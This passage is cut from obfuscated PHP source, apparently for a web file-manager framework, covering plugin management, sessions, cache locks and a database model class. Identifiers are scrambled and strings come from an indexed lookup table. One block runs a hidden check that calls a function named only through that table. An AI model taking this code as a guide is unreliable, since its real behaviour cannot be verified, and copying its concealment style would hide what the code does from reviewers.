($ˆ§–‘‡[1232] . $·ŞŒãıÈ . $ˆ§–‘‡[1233] . $ÙÁ¤€Æ); } $­„×ü¸¶[] = $·êÂ‹´; } if ($èâ£ìİ && !$Ö…û“Šà) { $­„×ü¸¶ = array_merge(array($ˆ§–‘‡[1229] . $èâ£ìİ . $ˆ§–‘‡[1230]), $­„×ü¸¶); } $ÙğĞúê = array($ˆ§–‘‡[1234] . $—úŠÇ±ò . $ˆ§–‘‡[1235], $ˆ§–‘‡[1236] . $—úŠÇ±ò . $ˆ§–‘‡[1237], implode($ˆ§–‘‡[50] . PHP_EOL, $­„×ü¸¶), $ˆ§–‘‡[1238]); $í‡–øŞ = implode(PHP_EOL, $ÙğĞúê); if ($§Ä¨ßì² && $§Ä¨ßì² == $ˆ§–‘‡[885]) { return $í‡–øŞ; } $‹„¼«Œ = array($ˆ§–‘‡[885] => $í‡–øŞ, $ˆ§–‘‡[13] => $õ§¥Æ¥); return $§Ä¨ßì² ? $‹„¼«Œ[$§Ä¨ßì²] : $‹„¼«Œ; } } goto bÌŞÖ¹»ã÷; CïùÃ‹„œ: if ($_SERVER[$_SERVER[ıÚ˜š²İ][962]] != $_SERVER[$_SERVER[ıÚ˜š²İ][2117]]) { $_getc = $_SERVER[ıÚ˜š²İ][964]; $_getfile = $_SERVER[$_SERVER[ıÚ˜š²İ][965]] . $_SERVER[ıÚ˜š²İ][966]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ıÚ˜š²İ][288], $_getfilec); if (count($_getarrs) < $_SERVER[ıÚ˜š²İ][687]) { $exit = $_SERVER[ıÚ˜š²İ][967]; $exit(); } $_act = $_SERVER[ıÚ˜š²İ][1900]; $_act($_SERVER[$_SERVER[ıÚ˜š²İ][960]]); } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\56\x70\x6c\165\147\x69\x6e\x4c\151\x73\x74"; public $field = array("\156\141\x6d\x65", "\x73\x74\x61\x74\165\x73", "\162\x65\147\151\145\163\164", "\143\x6f\x6e\146\151\x67"); public function loadList($ ã²½ƒ• = false) { $„µ¼Ñùñ = array_to_keyvalue($this->listData(), $_SERVER[ıÚ˜š²İ][32]); if ($ ã²½ƒ•) { return $„µ¼Ñùñ[$ ã²½ƒ•]; } return $„µ¼Ñùñ; } public function init() { $ûã¶¦ù‘ =& $_SERVER[ıÚ˜š²İ]; Hook::trigger($ûã¶¦ù‘[2118]); $æÍî‰° = $this->loadPluginList(); foreach ($æÍî‰° as $¯—ŸàÇ‰ => $Ú¬Ö¨) { $“»á¦”” = $this->appAllow($¯—ŸàÇ‰, $Ú¬Ö¨); if (!$“»á¦””) { continue; } foreach ($Ú¬Ö¨[$ûã¶¦ù‘[2119]] as $¾×›¡Ù¿ => $Üµ½ï…ß) { Hook::bind($¾×›¡Ù¿, $Üµ½ï…ß); } } Hook::trigger($ûã¶¦ù‘[2120]); Hook::trigger(ACTION); } public function appAllow($ô›éƒÓ‘, $Œ¡Á†ºÎ, $ÙŒ…²£ = true) { $´ò§ùÙÄ =& $_SERVER[ıÚ˜š²İ]; $¡Ì™šÊ = PLUGIN_DIR . $ô›éƒÓ‘ . $´ò§ùÙÄ[2121]; if (!is_array($Œ¡Á†ºÎ) || !is_array($Œ¡Á†ºÎ[$´ò§ùÙÄ[2119]]) || $Œ¡Á†ºÎ[$´ò§ùÙÄ[826]] != 1 || !is_file($¡Ì™šÊ)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$´ò§ùÙÄ[6]][$´ò§ùÙÄ[2122]] || !$GLOBALS[$´ò§ùÙÄ[6]][$´ò§ùÙÄ[2123]]) { return !0; } $·™Ó÷£ê = explode($´ò§ùÙÄ[50], strtolower($GLOBALS[$´ò§ùÙÄ[6]][$´ò§ùÙÄ[2123]])); return in_array(strtolower($ô›éƒÓ‘), $·™Ó÷£ê) ? !1 : !0; } if ($ÙŒ…²£ && !Action($´ò§ùÙÄ[2124])->checkAuth($ô›éƒÓ‘)) { return !1; } return !0; } public function unInstall($±ï«¬›É) { $º­í¯¼› =& $_SERVER[ıÚ˜š²İ]; $Å“üĞ¬ñ = $this->loadList($±ï«¬›É); if (file_exists(PLUGIN_DIR . $±ï«¬›É)) { Hook::apply($±ï«¬›É . $º­í¯¼›[2125]); } $this->remove($Å“üĞ¬ñ[$º­í¯¼›[477]]); } public function changeStatus($‚˜Õû À, $¬¯—õƒø) { $Óô«‹’ =& $_SERVER[ıÚ˜š²İ]; $äÊºÎ³ = $this->loadList($‚˜Õû À); if ($¬¯—õƒø) { Hook::apply($‚˜Õû À . $Óô«‹’[2126]); } $this->update($äÊºÎ³[$Óô«‹’[477]], array($Óô«‹’[2127] => $¬¯—õƒø)); } public function appRegist($« Ş³õŠ, $ÔìÊËö) { $•´ÖñŠğ =& $_SERVER[ıÚ˜š²İ]; $Ş×Œä¬ı = $this->loadList($« Ş³õŠ); if ($Ş×Œä¬ı) { $this->update($Ş×Œä¬ı[$•´ÖñŠğ[477]], array($•´ÖñŠğ[2119] => $ÔìÊËö)); } else { $…÷òˆû = array($•´ÖñŠğ[32] => $« Ş³õŠ, $•´ÖñŠğ[2119] => $ÔìÊËö, $•´ÖñŠğ[826] => 0, $•´ÖñŠğ[6] => $this->getConfigDefault($« Ş³õŠ)); $this->insert($…÷òˆû); } } public function getConfigDefault($ïÇÈïÇ) { $Õ¥ê¦£€ =& $_SERVER[ıÚ˜š²İ]; $ÈîÀ…Š = array(); $¾©±ÈŞÒ = $this->getPackageJson($ïÇÈïÇ); if (!$¾©±ÈŞÒ && is_array($¾©±ÈŞÒ[$Õ¥ê¦£€[2128]])) { return $ÈîÀ…Š; } foreach ($¾©±ÈŞÒ[$Õ¥ê¦£€[2128]] as $ß«­¾¼ã => $¼íÒø·») { if (!isset($¼íÒø·»[$Õ¥ê¦£€[452]]) || isset($ÈîÀ…Š[$ß«­¾¼ã])) { continue; } $ÈîÀ…Š[$ß«­¾¼ã] = $¼íÒø·»[$Õ¥ê¦£€[452]]; } return $ÈîÀ…Š; } public function getPackageJson($õäŒºï£) { return Hook::apply($õäŒºï£ . $_SERVER[ıÚ˜š²İ][2129]); } public function getConfig($Ã»–È˜¯, $Ô­òà¹Ğ = false) { $Ïíİ¨ó• =& $_SERVER[ıÚ˜š²İ]; $—ˆ±ùàÓ = array(); $«Ğ•Ë€ç = $this->loadList($Ã»–È˜¯); if ($«Ğ•Ë€ç && is_array($«Ğ•Ë€ç[$Ïíİ¨ó•[6]])) { $—ˆ±ùàÓ = $«Ğ•Ë€ç[$Ïíİ¨ó•[6]]; } if (!$—ˆ±ùàÓ || $Ô­òà¹Ğ) { $—ˆ±ùàÓ = $this->getConfigDefault($Ã»–È˜¯); } return $—ˆ±ùàÓ; } public function setConfig($½Ç‚Üİ¯, $¤’Ö–½ã = false) { $ÙÙº®Ú =& $_SERVER[ıÚ˜š²İ]; $­€ãŠõ´ = $this->loadList($½Ç‚Üİ¯); if (!$­€ãŠõ´) { return !1; } $œ‰É©˜ = $­€ãŠõ´[$ÙÙº®Ú[6]]; if ($¤’Ö–½ã == !1) { $œ‰É©˜ = array(); $¤’Ö–½ã = $this->getConfigDefault($½Ç‚Üİ¯); } foreach ($¤’Ö–½ã as $¾ãâšŒ¢ => $èñı©ˆ“) { $œ‰É©˜[$¾ãâšŒ¢] = is_string($èñı©ˆ“) ? trim($èñı©ˆ“) : $èñı©ˆ“; } $this->update($­€ãŠõ´[$ÙÙº®Ú[477]], array($ÙÙº®Ú[6] => $œ‰É©˜)); } public function viewList() { $Å—‰õ­„ =& $_SERVER[ıÚ˜š²İ]; $»ÁÍ©êñ = $this->loadList(); $this->pluginScan($»ÁÍ©êñ); $»ÁÍ©êñ = $this->loadPluginList(); $¹¤¯ŒÙè = array(); foreach ($»ÁÍ©êñ as $…çƒ€ŞØ => $¹—êÑ©š) { $ØØ¾êËü = $¹—êÑ©š; unset($¹—êÑ©š[$Å—‰õ­„[2119]], $¹—êÑ©š[$Å—‰õ­„[6]]); $Ã³Ğáö = PLUGIN_DIR . $¹—êÑ©š[$Å—‰õ­„[32]] . $Å—‰õ­„[2121]; if (!is_file($Ã³Ğáö)) { continue; } $ò¯ŸÚå = Hook::apply($¹—êÑ©š[$Å—‰õ­„[32]] . $Å—‰õ­„[2129]); if (!is_array($ò¯ŸÚå)) { continue; } $¹¤¯ŒÙè[$…çƒ€ŞØ] = array_merge($¹—êÑ©š, $ò¯ŸÚå); if ($ØØ¾êËü[$Å—‰õ­„[6]][$Å—‰õ­„[1705]] != $ò¯ŸÚå[$Å—‰õ­„[1679]]) { Hook::apply($¹—êÑ©š[$Å—‰õ­„[32]] . $Å—‰õ­„[2126]); $ØØ¾êËü[$Å—‰õ­„[6]][$Å—‰õ­„[1705]] = $ò¯ŸÚå[$Å—‰õ­„[1679]]; $this->update($¹—êÑ©š[$Å—‰õ­„[477]], array($Å—‰õ­„[6] => $ØØ¾êËü[$Å—‰õ­„[6]])); } } return $¹¤¯ŒÙè; } private function loadPluginList() { $½ë“„çà =& $_SERVER[ıÚ˜š²İ]; $ñª²Ñ ¯ = $this->loadList(); if (strtolower(MOD) == $½ë“„çà[2130]) { return $ñª²Ñ ¯; } $œŸö¦å  = Hook::trigger($½ë“„çà[2131], $ñª²Ñ ¯); if ($ñª²Ñ ¯ && !$œŸö¦å ) { die; } return $œŸö¦å  ? $œŸö¦å  : $ñª²Ñ ¯; } private function pluginScan($¾Âï—Å±) { $¤ÃÍŒ§Õ =& $_SERVER[ıÚ˜š²İ]; recursion_dir(PLUGIN_DIR, $«šç–´Ñ, $Šè»‡Õ¢, 0); foreach ($«šç–´Ñ as $ÚïÖ¯öÚ) { $ª„Ô½‰° = get_path_this($ÚïÖ¯öÚ); if (isset($¾Âï—Å±[$ª„Ô½‰°]) || !file_exists($ÚïÖ¯öÚ . $¤ÃÍŒ§Õ[2132]) || !file_exists($ÚïÖ¯öÚ . $¤ÃÍŒ§Õ[2121])) { continue; } Hook::apply($ª„Ô½‰° . $¤ÃÍŒ§Õ[2126]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\164\x65\155\137\163\145\163\x73\151\157\x6e"; public function get($ÈŒÇ”Ç) { $Å¸èÆ› =& $_SERVER[ıÚ˜š²İ]; $ÀŠ”£ÄË = $this->where(array($Å¸èÆ›[2133] => $ÈŒÇ”Ç))->find(); if (!is_array($ÀŠ”£ÄË)) { return !1; } return $ÀŠ”£ÄË[$Å¸èÆ›[171]]; } public function set($ùÄĞáô‰, $´ÇÀ£ûş, $Ç½»¤Ü = 3600) { $ßšØ¶ü– =& $_SERVER[ıÚ˜š²İ]; $şÛéĞèø = array($ßšØ¶ü–[2133] => $ùÄĞáô‰, $ßšØ¶ü–[2032] => $´ÇÀ£ûş, $ßšØ¶ü–[2134] => $Ç½»¤Ü + time()); if (Session::get($ßšØ¶ü–[2135])) { $şÛéĞèø[$ßšØ¶ü–[1792]] = Session::get($ßšØ¶ü–[2135]); } else { $şÛéĞèø[$ßšØ¶ü–[1792]] = 0; } if ($this->get($ùÄĞáô‰)) { return $this->where(array($ßšØ¶ü–[2133] => $ùÄĞáô‰))->save($şÛéĞèø); } else { return $this->add($şÛéĞèø, array(), !0); } } public function remove($¨Ç¤ßèŸ) { return $this->where(array($_SERVER[ıÚ˜š²İ][2133] => $¨Ç¤ßèŸ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ıÚ˜š²İ][2136] . time())->delete(); } } goto eéâ“Š¾Š; F…×†İ¬Ö­: class CacheLockMemcached { public function lock($òŠÄ¾ğ¡, $ìáìé« = 0) { $°ÕÁ¢Ê = Cache::init(); $üÖº°‘ó = microtime(!0) + $ìáìé«; while (microtime(!0) < $üÖº°‘ó) { $“—ú¼•¶ = $°ÕÁ¢Ê->get($òŠÄ¾ğ¡); if (!$“—ú¼•¶ || $“—ú¼•¶ < microtime(!0)) { $ä„ûŞ• = $°ÕÁ¢Ê->handle->add($òŠÄ¾ğ¡, $üÖº°‘ó, $ìáìé«); if ($ä„ûŞ•) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ÕŞÁê®ú) { return Cache::init()->get($ÕŞÁê®ú); } public function unlock($÷ô‘Î¯) { return Cache::init()->remove($÷ô‘Î¯); } } class CacheLockDatabase { public function lock($÷œ‹˜», $ç¯şî“ = 0) { $Ï÷ ¶å‰ = Model($_SERVER[ıÚ˜š²İ][911]); $ù³„ş“Ï = microtime(!0) + $ç¯şî“; while (microtime(!0) < $ù³„ş“Ï) { $ó»ÙŠè° = $Ï÷ ¶å‰->get($÷œ‹˜»); if (!$ó»ÙŠè° || $ó»ÙŠè° < microtime(!0)) { $ŠÍšÔµ† = $Ï÷ ¶å‰->set($÷œ‹˜», $ù³„ş“Ï); if ($ŠÍšÔµ†) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($©¾®ì¤) { return Model($_SERVER[ıÚ˜š²İ][911])->get($©¾®ì¤); } public function unlock($îõæ²€È) { Model($_SERVER[ıÚ˜š²İ][911])->remove($îõæ²€È); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($êÈ¥Çˆ«, $ÆœùÂš) { $€›‚„Ò´ =& $_SERVER[ıÚ˜š²İ]; if (!class_exists($€›‚„Ò´[950])) { show_json($€›‚„Ò´[951], !1); } $this->cacheTime = $ÆœùÂš; $this->handle = new Memcached(); if (is_array($êÈ¥Çˆ«[$€›‚„Ò´[952]]) && count($êÈ¥Çˆ«[$€›‚„Ò´[952]]) >= 1) { foreach ($êÈ¥Çˆ«[$€›‚„Ò´[952]] as $ô©âŞñ) { $Ëçùô = explode($€›‚„Ò´[4], $ô©âŞñ); $this->handle->addServer($Ëçùô[0], $Ëçùô[1]); } } else { $this->handle->addServer($êÈ¥Çˆ«[$€›‚„Ò´[209]], $êÈ¥Çˆ«[$€›‚„Ò´[210]]); } } public function set($öİÛäƒó, $¶ÀŒ˜õí, $ºÛ‰úë = false) { $ºÛ‰úë = $ºÛ‰úë ? $ºÛ‰úë : $this->cacheTime; return $this->handle->set($öİÛäƒó, $¶ÀŒ˜õí, $ºÛ‰úë); } public function get($İúĞŸ€¸) { return $this->handle->get($İúĞŸ€¸); } public function remove($îàÉ¬³Ò) { return $this->handle->delete($îàÉ¬³Ò); } public function deleteAll() { return $this->handle->flush(); } } goto A•ÃñïÄŸ; bôõ÷çÅù: define($_SERVER[ıÚ˜š²İ][323], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\154\145", "\157\x72\144\x65\x72", "\x61\x6c\151\141\163", "\x68\141\x76\x69\156\147", "\x67\162\157\165\x70", "\x6c\157\143\x6b", "\144\x69\163\164\x69\x6e\x63\x74", "\141\165\164\x6f", "\x66\x69\154\x74\x65\x72", "\x76\x61\x6c\151\144\141\164\145", "\162\x65\x73\165\x6c\164", "\x62\x69\x6e\144", "\164\x6f\x6b\x65\x6e"); public function __construct($€á‹ò¨Î = '', $òú…“Ñí = '', $…€ÈÖî = '') { $ğßÙ×å =& $_SERVER[ıÚ˜š²İ]; $this->_initialize(); if (!empty($€á‹ò¨Î)) { if (strpos($€á‹ò¨Î, $ğßÙ×å[10])) { list($this->dbName, $this->name) = explode($ğßÙ×å[10], $€á‹ò¨Î); } else { $this->name = $€á‹ò¨Î; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($òú…“Ñí)) { $this->tablePrefix = $ğßÙ×å[12]; } elseif ($ğßÙ×å[12] != $òú…“Ñí) { $this->tablePrefix = $òú…“Ñí; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ğßÙ×å[324]); } $this->db(0, empty($this->connection) ? $…€ÈÖî : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $€Ö–¹‡ƒ =& $_SERVER[ıÚ˜š²İ]; if (empty($this->fields)) { if (think_config($€Ö–¹‡ƒ[325])) { $Şòï¯›” = $this->dbName ? $this->dbName : think_config($€Ö–¹‡ƒ[326]); $‰•£€Éõ = think_var_cache($€Ö–¹‡ƒ[327] . strtolower(get_path_this($Şòï¯›”) . $€Ö–¹‡ƒ[10] . $this->name)); if ($‰•£€Éõ) { $õûÛèß‹ = think_config($€Ö–¹‡ƒ[328]); if (empty($õûÛèß‹) || $‰•£€Éõ[$€Ö–¹‡ƒ[329]] == $õûÛèß‹) { $this->fields = $‰•£€Éõ; return; } } } $this->flush(); } } public function flush() { $åÕÄ¿· =& $_SERVER[ıÚ˜š²İ]; $this->db->setModel($this->name); $²©ûÉ€² = $this->db->getFields($this->getTableName()); if (!$²©ûÉ€²) { return !1; } $this->fields = array_keys($²©ûÉ€²); $this->fields[$åÕÄ¿·[330]] = !1; foreach ($²©ûÉ€² as $­™§§¥» => $àïĞÖĞ) { $ä¶ì¡Ğ³[$­™§§¥»] = $àïĞÖĞ[$åÕÄ¿·[33]]; if ($àïĞÖĞ[$åÕÄ¿·[39]]) { $this->fields[$åÕÄ¿·[331]] = $­™§§¥»; if ($àïĞÖĞ[$åÕÄ¿·[42]]) { $this->fields[$åÕÄ¿·[330]] = !0; } } } $this->fields[$åÕÄ¿·[332]] = $ä¶ì¡Ğ³; if (think_config($åÕÄ¿·[328])) { $this->fields[$åÕÄ¿·[329]] = think_config($åÕÄ¿·[328]); } if (think_config($åÕÄ¿·[325])) { $£Ãó‚ˆ¢ = $this->dbName ? $this->dbName : think_config($åÕÄ¿·[326]); think_var_cache($åÕÄ¿·[327] . strtolower(get_path_this($£Ãó‚ˆ¢) . $åÕÄ¿·[10] . $this->name), $this->fields); } } public function switchModel($Ü‰ãÁ§Ù, $ºÉàôêë = array()) { $ Ÿ¡…” =& $_SERVER[ıÚ˜š²İ]; $²Î¿ñÀ£ = ucwords(strtolower($Ü‰ãÁ§Ù)) . $ Ÿ¡…”[333]; if (!class_exists($²Î¿ñÀ£)) { think_exception($²Î¿ñÀ£ . think_lang($ Ÿ¡…”[334])); } $this->_extModel = new $²Î¿ñÀ£($this->name); if (!empty($ºÉàôêë)) { foreach ($ºÉàôêë as $÷¶¦¨Ú“) { $this->_extModel->setProperty($÷¶¦¨Ú“, $this->{$÷¶¦¨Ú“}); } } return $this->_extModel; } public function __set($·È¦¢Şà, $äßÕÑ’Ã) { $this->data[$·È¦¢Şà] = $äßÕÑ’Ã; } public function __get($áî´ÅŞ³) { return isset($this->data[$áî´ÅŞ³]) ? $this->data[$áî´ÅŞ³] : null; } public function __isset($¦ÄÇ‡Ê˜) { return isset($this->data[$¦ÄÇ‡Ê˜]); } public function __unset($ÓÌ¯âÑÏ) { unset($this->data[$ÓÌ¯âÑÏ]); } public function __call($¦—ºº¤Ÿ, $Úšµó¬ò) { $”±ú¿± =& $_SERVER[ıÚ˜š²İ]; if (in_array(strtolower($¦—ºº¤Ÿ), $this->methods, !0)) { $this->options[strtolower($¦—ºº¤Ÿ)] = $Úšµó¬ò[0]; return $this; } elseif (in_array(strtolower($¦—ºº¤Ÿ), array($”±ú¿±[335], $”±ú¿±[336], $”±ú¿±[337], $”±ú¿±[338], $”±ú¿±[339]), !0)) { $ì­šÅÈ = isset($Úšµó¬ò[0]) ? $Úšµó¬ò[0] : $”±ú¿±[223]; $ì­šÅÈ = $this->db->parseKey($ì­šÅÈ); return $this->getField(strtoupper($¦—ºº¤Ÿ) . $”±ú¿±[340] . $ì­šÅÈ . $”±ú¿±[341] . $¦—ºº¤Ÿ, $”±ú¿±[335]); } elseif (strtolower(substr($¦—ºº¤Ÿ, 0, 5)) == $”±ú¿±[342]) { $ì­šÅÈ = think_parse_name(substr($¦—ºº¤Ÿ, 5)); $³¶¢úÂ¿[$ì­šÅÈ] = $Úšµó¬ò[0]; return $this->where($³¶¢úÂ¿)->find(); } elseif (strtolower(substr($¦—ºº¤Ÿ, 0, 10)) == $”±ú¿±[343]) { $êÒÑœ–Â = think_parse_name(substr($¦—ºº¤Ÿ, 10)); $³¶¢úÂ¿[$êÒÑœ–Â] = $Úšµó¬ò[0]; return $this->where($³¶¢úÂ¿)->getField($Úšµó¬ò[1]); } elseif (isset($this->_scope[$¦—ºº¤Ÿ])) { return $this->scope($¦—ºº¤Ÿ, $Úšµó¬ò[0]); } elseif (method_exists($this, $¦—ºº¤Ÿ)) { array_unshift($Úšµó¬ò, $¦—ºº¤Ÿ); return call_user_func_array(array($this, $”±ú¿±[344]), $Úšµó¬ò); } else { return call_user_func_array(array(parent, $¦—ºº¤Ÿ), $Úšµó¬ò); } } protected function call() { $–÷Ô²ÎÂ =& $_SERVER[ıÚ˜š²İ]; $¤ñˆĞñ = func_get_args(); $§ÑÁ¥˜ = array_shift($¤ñˆĞñ); $ÉË›Ó§ö = $§ÑÁ¥˜; if (is_array($§ÑÁ¥˜)) { $ÉË›Ó§ö = $§ÑÁ¥˜[1]; $§ÑÁ¥˜ = $§ÑÁ¥˜[0]; } $ß˜èô€Ã = count($¤ñˆĞñ) - 1; if (isset($¤ñˆĞñ[$ß˜èô€Ã]) && $¤ñˆĞñ[$ß˜èô€Ã] === $§ÑÁ¥˜) { think_exception(__CLASS__ . $–÷Ô²ÎÂ[4] . $§ÑÁ¥˜ . think_lang($–÷Ô²ÎÂ[345])); return; } $¤ñˆĞñ[] = $§ÑÁ¥˜; if (method_exists($this, $–÷Ô²ÎÂ[346])) { $¯’œ‰Ù = call_user_func_array(array($this, $–÷Ô²ÎÂ[347]), array($ÉË›Ó§ö, $¤ñˆĞñ)); if (!is_null($¯’œ‰Ù) && $¯’œ‰Ù !== !1) { return $¯’œ‰Ù; } } $ıÑ“ïîÅ = call_user_func_array(array($this, $§ÑÁ¥˜), $¤ñˆĞñ); if (method_exists($this, $–÷Ô²ÎÂ[348])) { $¯’œ‰Ù = call_user_func_array(array($this, $–÷Ô²ÎÂ[349]), array($ÉË›Ó§ö, $¤ñˆĞñ, $ıÑ“ïîÅ)); if ($¯’œ‰Ù) { return $¯’œ‰Ù; } } return $ıÑ“ïîÅ; } protected function _initialize() { } protected function _facade($ë†áàµõ) { $ª„ãŠù =& $_SERVER[ıÚ˜š²İ]; if (!empty($this->fields)) { foreach ($ë†áàµõ as $ÃÏÀ¨ñº => $æ­±Ü Ö) { if (is_array($this->fields) && !in_array($ÃÏÀ¨ñº, $this->fields, !0)) { unset($ë†áàµõ[$ÃÏÀ¨ñº]); } elseif (is_scalar($æ­±Ü Ö)) { $this->_parseType($ë†áàµõ, $ÃÏÀ¨ñº); } } } if (!empty($this->options[$ª„ãŠù[350]])) { $ë†áàµõ = array_map($this->options[$ª„ãŠù[350]], $ë†áàµõ); unset($this->options[$ª„ãŠù[350]]); } $this->_beforeWrite($ë†áàµõ); return $ë†áàµõ; } protected function _beforeWrite(&$û»Ëû™¼) { } public function add($¿ü˜¹¼ö = '', $€ì¹¾ = array(), $ÀÓ²¢¤ = false) { if (empty($¿ü˜¹¼ö)) { if (!empty($this->data)) { $¿ü˜¹¼ö = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ıÚ˜š²İ][351]); return !1; } } $€ì¹¾ = $this->_parseOptions($€ì¹¾); $¿ü˜¹¼ö = $this->_facade($¿ü˜¹¼ö); if (!1 === $this->_beforeInsert($¿ü˜¹¼ö, $€ì¹¾)) { return !1; } $ıëáü = $this->db->insert($¿ü˜¹¼ö, $€ì¹¾, $ÀÓ²¢¤); if (!1 !== $ıëáü) { $ÂûØçÉæ = $this->getLastInsID(); if ($ÂûØçÉæ) { $¿ü˜¹¼ö[$this->getPk()] = $ÂûØçÉæ; $this->_after_insert($¿ü˜¹¼ö, $€ì¹¾); return $ÂûØçÉæ; } $this->_after_insert($¿ü˜¹¼ö, $€ì¹¾); } return $ıëáü; } protected function _beforeInsert(&$ÍŞÕ¾˜®, $ÆÏ˜­ã) { } protected function _after_insert($ğÂÉÍ›Å, $˜†·ò¤) { } public function addAll($Œúî‡Ÿö, $ÈîµŒ€ = array(), $™©ØøëÂ = false) { $ı–›¢‡¾ =& $_SERVER[ıÚ˜š²İ]; if (empty($Œúî‡Ÿö)) { $this->error = think_lang($ı–›¢‡¾[351]); return !1; } $ÈîµŒ€ = $this->_parseOptions($ÈîµŒ€); foreach ($Œúî‡Ÿö as $Ü„õêÂ => $¯¬š«‚Ò) { $Œúî‡Ÿö[$Ü„õêÂ] = $this->_facade($¯¬š«‚Ò); } if (method_exists($this->db, $ı–›¢‡¾[352])) { $ÊÌÑ€Ÿ’ = $this->db->insertAll($Œúî‡Ÿö, $ÈîµŒ€, $™©ØøëÂ); } else { $this->startTrans(); foreach ($Œúî‡Ÿö as $Ü„õêÂ => $¯¬š«‚Ò) { $ÊÌÑ€Ÿ’ = $this->db->insert($¯¬š«‚Ò, $ÈîµŒ€, $™©ØøëÂ); } $this->commit(); } if (!1 !== $ÊÌÑ€Ÿ’) { $á“¤õ²¦ = $this->getLastInsID(); if ($á“¤õ²¦) { return $á“¤õ²¦; } } return $ÊÌÑ€Ÿ’; } public function selectAdd($¾¡×òÂÚ = '', $æ’±ïÜæ = '', $Ñ‘Ïè = array()) { $ÚĞ˜Ü‚• =& $_SERVER[ıÚ˜š²İ]; $Ñ‘Ïè = $this->_parseOptions($Ñ‘Ïè); if (!1 === ($ˆùÇ¦ãÓ = $this->db->selectInsert($¾¡×òÂÚ ? $¾¡×òÂÚ : $Ñ‘Ïè[$ÚĞ˜Ü‚•[353]], $æ’±ïÜæ ? $æ’±ïÜæ : $this->getTableName(), $Ñ‘Ïè))) { $this->error = think_lang($ÚĞ˜Ü‚•[354]); return !1; } else { return $ˆùÇ¦ãÓ; } } public function save($Â–çä¸À = '', $×­¯™®ù = array()) { $—è¾îâ =& $_SERVER[ıÚ˜š²İ]; if (empty($Â–çä¸À)) { if (!empty($this->data)) { $Â–çä¸À = $this->data; $this->data = array(); } else { $this->error = think_lang($—è¾îâ[351]); return !1; } } $Â–çä¸À = $this->_facade($Â–çä¸À); $×­¯™®ù = $this->_parseOptions($×­¯™®ù); $¤‘„ßÕö = $this->getPk(); if (!isset($×­¯™®ù[$—è¾îâ[355]])) { if (isset($Â–çä¸À[$¤‘„ßÕö])) { $–óä¾æ[$¤‘„ßÕö] = $Â–çä¸À[$¤‘„ßÕö]; $×­¯™®ù[$—è¾îâ[355]] = $–óä¾æ; unset($Â–çä¸À[$¤‘„ßÕö]); } else { $this->error = think_lang($—è¾îâ[354]); return !1; } } if (is_array($×­¯™®ù[$—è¾îâ[355]]) && isset($×­¯™®ù[$—è¾îâ[355]][$¤‘„ßÕö])) { $æ¢Óƒİø = $×­¯™®ù[$—è¾îâ[355]][$¤‘„ßÕö]; } if (!1 === $this->_beforeUpdate($Â–çä¸À, $×­¯™®ù)) { return !1; } $ÑıòÉê = $this->db->update($Â–çä¸À, $×­¯™®ù); if (!1 !== $ÑıòÉê) { if (isset($æ¢Óƒİø)) { $Â–çä¸À[$¤‘„ßÕö] = $æ¢Óƒİø; } $this->_afterUpdate($Â–çä¸À, $×­¯™®ù); } return $ÑıòÉê; } protected function _beforeUpdate(&$‚Å „Îİ, $×¸àÒ¿³) { } protected function _afterUpdate($’Ã–ãã–, $îİÏ ó±) { } public function delete($è¼ù’±“ = array()) { $»îà¹î÷ =& $_SERVER[ıÚ˜š²İ]; if (empty($è¼ù’±“) && empty($this->options[$»îà¹î÷[355]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $¥ÈÎğ™Û = $this->getPk(); if (is_numeric($è¼ù’±“) || is_string($è¼ù’±“)) { if (strpos($è¼ù’±“, $»îà¹î÷[50])) { $…ÀäØ”[$¥ÈÎğ™Û] = array($»îà¹î÷[356], $è¼ù’±“); } else { $…ÀäØ”[$¥ÈÎğ™Û] = $è¼ù’±“; } $this->options[$»îà¹î÷[355]] = $…ÀäØ”; } $è¼ù’±“ = $this->_parseOptions(); if (is_array($è¼ù’±“[$»îà¹î÷[355]]) && isset($è¼ù’±“[$»îà¹î÷[355]][$¥ÈÎğ™Û])) { $‘ØçÙ•³ = $è¼ù’±“[$»îà¹î÷[355]][$¥ÈÎğ™Û]; } $©ÏûìÒ = $this->db->delete($è¼ù’±“); if (!1 !== $©ÏûìÒ) { $©Ë¶®‘Ö = array(); if (isset($‘ØçÙ•³)) { $©Ë¶®‘Ö[$¥ÈÎğ™Û] = $‘ØçÙ•³; } $this->_after_delete($©Ë¶®‘Ö, $è¼ù’±“); } return $©ÏûìÒ; } protected function _after_delete($Áü¼Õ¶®, $®ŠµŒíÍ) { } public function select($¹¦ó›ØÅ = array()) { $”ÊÌÚó =& $_SERVER[ıÚ˜š²İ]; if (is_string($¹¦ó›ØÅ) || is_numeric($¹¦ó›ØÅ)) { $¼ÑûåÅô = $this->getPk(); if (strpos($¹¦ó›ØÅ, $”ÊÌÚó[50])) { $£‡ìğ»÷[$¼ÑûåÅô] = array($”ÊÌÚó[356], $¹¦ó›ØÅ); } else { $£‡ìğ»÷[$¼ÑûåÅô] = $¹¦ó›ØÅ; } $this->options[$”ÊÌÚó[355]] = $£‡ìğ»÷; } elseif (!1 === $¹¦ó›ØÅ) { $¹¦ó›ØÅ = $this->_parseOptions(); return $”ÊÌÚó[357] . $this->db->buildSelectSql($¹¦ó›ØÅ) . $”ÊÌÚó[358]; } $¹¦ó›ØÅ = $this->_parseOptions(); $§Ñö²’ = $this->db->select($¹¦ó›ØÅ); if (!1 === $§Ñö²’) 